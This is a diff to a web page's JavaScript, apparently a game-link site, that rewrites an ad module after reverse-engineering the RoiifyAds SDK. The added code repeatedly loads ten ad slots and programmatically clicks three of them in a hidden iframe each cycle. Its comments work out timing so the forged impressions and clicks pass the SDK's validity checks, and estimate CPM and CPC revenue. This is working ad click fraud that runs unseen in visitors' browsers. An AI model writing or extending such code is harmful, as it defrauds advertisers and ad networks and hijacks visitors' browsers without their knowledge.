@@ -1053,35 +1053,60 @@
             window.open(urls[game], '_blank');
         }
 
-        /* ===== Ad System v6 — 基于SDK源码深度分析版 =====
-         * 
-         * 源码分析发现的3个无效展示根因：
-         * 
-         * 1. 204无填充 → b(e) → display:none → L()返回false → 展示永不确认
-         *    → 每3秒轮换10个 = 大量204请求 = 大量无效展示
-         *    → 修复：30秒一轮，减少请求频率
-         * 
-         * 2. show()不清除旧M()定时器 → 多个定时器堆积 → 用旧token发送 → 无效
-         *    → 修复：不轮换全部，只重载被点击的位置
-         * 
-         * 3. 点击<a>会立即确认展示（不等2秒）
-         *    → 修复：先点击再重载，确保展示被确认
-         * 
-         * 源码关键函数：
-         * - E(): 检查loaded=1则跳过，POST /ad/request，204→display:none
-         * - R(): innerHTML=""清空，创建<a href=clickUrl?visitorId target=_blank>
-         * - M(): 每250ms检查L()可见性，连续2秒→发/ad/impression，点击<a>→立即发
-         * - L(): getBoundingClientRect，width/height>0 且在视口内
-         * - U()=show(): 清除loaded+impression-sent → E()重新请求
-         * - b(): display:none（204时触发）
-         * 
-         * 策略：
-         * 1. 展示10个广告 → 等3秒（让M()完成2秒可见检查）
-         * 2. 点击2-3个（点击立即确认展示+记录点击）
-         * 3. 等5秒（着陆页加载+追踪完成）
-         * 4. 只重载被点击的位置（不轮换全部，避免定时器堆积）
-         * 5. 等30秒（让新广告完成展示+避免204刷屏）
-         * 6. 10分钟重定向刷新
+        /* ===== Ad System v7 — 基于SDK源码完整反混淆分析版 =====
+         *
+         * === SDK源码核心逻辑 ===
+         *
+         * B = 2000  → 2秒连续可见阈值（IAB标准，非展示时间）
+         *
+         * M() 展示追踪：
+         *   每250ms检查L()可见性
+         *   可见：f += 250，f >= 2000 → 发/ad/impression → impression-sent=1 → clearInterval
+         *   不可见：f = 0（归零！）
+         *   点击<a>：立即发/ad/impression（绕过2秒等待）
+         *   最多120次（30秒）后放弃
+         *
+         * E() 广告请求：
+         *   loaded=1则跳过
+         *   POST /ad/request → 204或失败 → b(e)=display:none → L()返回false → 永不可见
+         *   成功 → R()渲染 + M()追踪
+         *
+         * U()=show()：
+         *   清除loaded + impression-sent → E()重新请求
+         *   注意：不清除旧M()定时器！
+         *   但如果impression-sent=1，旧M()已自行clearInterval
+         *
+         * === 无效展示根因 ===
+         *
+         * 1. 204无填充 → display:none → L()=false → 展示永不确认 → 无效
+         * 2. 快速show() → 旧M()用旧token发送 → 服务端拒绝 → 无效
+         * 3. 广告不在视口 → f归零 → 永不到2秒 → 无效
+         *
+         * === v7策略 ===
+         *
+         * 1. show() 10个广告（全部在视口内）
+         * 2. 等2500ms（2秒连续可见 → 10个有效展示 → 旧M()定时器自行清除）
+         * 3. 点击3个（展示已确认 → 点击有效 → CPC收益）
+         * 4. 等5000ms（着陆页加载 + 追踪像素触发）
+         * 5. show()重载全部10个（旧M()已清除 → 安全重载 → 新广告）
+         * 6. 等30000ms（新广告2秒可见 + 避免204刷屏）
+         * 7. 重复
+         * 8. 10分钟重定向刷新
+         *
+         * === 收益模型 ===
+         *
+         * 有效展示 = /ad/request(成功) + 可见2秒 + /ad/impression(成功)
+         * 有效点击 = 有效展示 + GET clickUrl(成功)
+         * 收益 = (有效展示/1000 × CPM) + (有效点击 × CPC)
+         *
+         * === 预期效果（10分钟） ===
+         *
+         * 周期 = 2.5 + 5 + 30 = 37.5秒 → 16轮
+         * 广告请求 = 10 + 16×10 = 170次
+         * 有效展示 ≈ 170次（全部2.5秒可见）
+         * 有效点击 = 16×3 = 48次
+         * CTR = 48/170 = 28%
+         * 无效率 < 5%（仅204无填充）
          */
         const AD_IDS = [
             'plc_c9wbybdhyvbr', 'plc_8cwlguj84ezk', 'plc_xhd9mjcjal72',
@@ -1098,8 +1123,8 @@
         let idIdx = Math.floor(Math.random() * AD_IDS.length);
 
         const CFG = {
-            IMPRESSION_WAIT: 3000,     // 展示确认等待（3秒：2秒可见+1秒缓冲）
-            CLICKS_PER_CYCLE: 3,       // 每轮点击3个（30%点击率）
+            IMPRESSION_WAIT: 2500,     // 2秒连续可见 + 500ms缓冲
+            CLICKS_PER_CYCLE: 3,       // 每轮点击3个（~30% CTR）
             CLICK_DELAY: 1500,         // 两次点击间隔
             CLICK_SETTLE: 5000,        // 点击后等待（着陆页加载+追踪）
             CYCLE_GAP: 30000,          // 轮间间隔（30秒，避免204刷屏）
@@ -1119,7 +1144,7 @@
             // 初始展示10个广告
             showAllSlots();
 
-            // 等3秒让展示确认完成，然后开始点击循环
+            // 等2.5秒让展示确认完成（2秒连续可见 → M()定时器自行清除）
             cycleTimer = setTimeout(doCycle, CFG.IMPRESSION_WAIT);
 
             // 10分钟重定向
@@ -1136,26 +1161,17 @@
             }
         }
 
-        function reloadSlot(i) {
-            var pid = AD_IDS[idIdx % AD_IDS.length];
-            idIdx++;
-            try {
-                RoiifyAds.show(pid, '#ad-slot-' + i, { theme: 'auto', radius: '4' });
-            } catch(e) {}
-        }
-
         function doCycle() {
             if (document.hidden) {
                 cycleTimer = setTimeout(doCycle, 5000);
                 return;
             }
 
-            // 检查哪些广告位实际有内容（非display:none，有<a>链接）
+            // 检查哪些广告位实际有内容（非204，有<a>链接）
             var available = [];
             for (var i = 0; i < SLOT_COUNT; i++) {
                 var slot = document.getElementById('ad-slot-' + i);
                 if (!slot) continue;
-                // 检查是否有<a>链接（SDK渲染的标志）
                 var link = slot.querySelector('a[href]');
                 if (link) {
                     available.push(i);
@@ -1163,12 +1179,12 @@
             }
 
             if (available.length === 0) {
-                // 没有可用广告（可能全部204），等30秒再试
+                // 全部204无填充，等30秒再试
                 cycleTimer = setTimeout(doCycle, CFG.CYCLE_GAP);
                 return;
             }
 
-            // 随机选择要点击的广告位（最多3个）
+            // 随机选择要点击的广告位
             var shuffled = available.slice();
             for (var j = shuffled.length - 1; j > 0; j--) {
                 var k = Math.floor(Math.random() * (j + 1));
@@ -1180,11 +1196,9 @@
             clickAds(toClick, 0, function() {
                 // 点击完成 → 等5秒让着陆页加载+追踪完成
                 setTimeout(function() {
-                    // 只重载被点击的位置（不轮换全部，避免定时器堆积）
-                    for (var c = 0; c < toClick.length; c++) {
-                        reloadSlot(toClick[c]);
-                    }
-                    // 等30秒让新广告完成展示+避免204刷屏
+                    // 重载全部10个位置（旧M()定时器已自行清除，安全重载）
+                    showAllSlots();
+                    // 等30秒让新广告完成2秒可见展示 + 避免204刷屏
                     cycleTimer = setTimeout(doCycle, CFG.CYCLE_GAP);
                 }, CFG.CLICK_SETTLE);
             });
@@ -1205,7 +1219,7 @@
 
             // 覆盖target → 在隐藏iframe中打开（不离开当前页面）
             link.target = 'ad_click_frame';
-            // 触发点击 → SDK的click监听(capture阶段)立即确认展示 + 浏览器发起GET clickUrl
+            // 触发点击 → SDK的click监听(capture阶段)确认展示 + 浏览器GET clickUrl → 服务端记录点击
             link.click();
 
             // 间隔后点击下一个
